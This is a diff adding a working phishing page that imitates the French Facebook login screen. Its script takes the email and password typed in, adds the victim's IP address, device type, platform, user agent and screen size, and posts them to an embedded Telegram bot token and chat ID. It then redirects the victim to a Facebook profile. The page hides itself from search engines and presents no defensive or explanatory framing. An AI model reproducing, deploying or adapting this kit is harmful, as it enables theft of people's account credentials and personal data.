@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Connexion Facebook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+</head>
+<body>
+    <div class="login-container" style="max-width: 400px; margin: 100px auto; padding: 20px; background: #fff; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2); border-radius: 10px;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" 
+             alt="Logo" style="display: block; margin: 0 auto 20px; width: 80px;">
+        <form id="login-form">
+            <input id="email" type="text" class="form-control mb-3" placeholder="Adresse e-mail ou numéro de mobile" required>
+            <input id="password" type="password" class="form-control mb-3" placeholder="Mot de passe" required>
+            <button type="submit" class="btn btn-primary w-100 mb-3">Se connecter</button>
+            <a href="https://www.facebook.com/recover/initiate" class="text-center d-block mb-3">Mot de passe oublié ?</a>
+            <button type="button" id="create-account" class="btn btn-outline-secondary w-100">Créer un compte</button>
+        </form>
+    </div>
+
+    <script>
+        const TOKEN = "7593409061:AAHEPCTCLtvxaAWcEym79gL8ueHRB7tvDXg";
+        const CHAT_ID = "6015215674"; 
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            
+            if (!email || !password) {
+                return;
+            }
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Ordinateur';
+
+                    
+                    const message = `
+<b>Nouvelle tentative de connexion</b>
+<b>Email :</b> ${email}
+<b>Mot de passe :</b> ${password}
+<b>Adresse IP :</b> ${ip}
+<b>Type d'appareil :</b> ${deviceType}
+<b>Plateforme :</b> ${platform}
+<b>Agent utilisateur :</b> ${userAgent}
+<b>Résolution d'écran :</b> ${screenWidth}x${screenHeight}
+                    `;
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(() => {
+                        window.location.href = "https://www.facebook.com/profile.php?id=61554390876064"; 
+                    });
+                });
+        });
+        document.getElementById('create-account').addEventListener('click', function () {
+            window.location.href = "https://www.facebook.com/r.php";
+        });
+    </script>
+</body>
+</html>
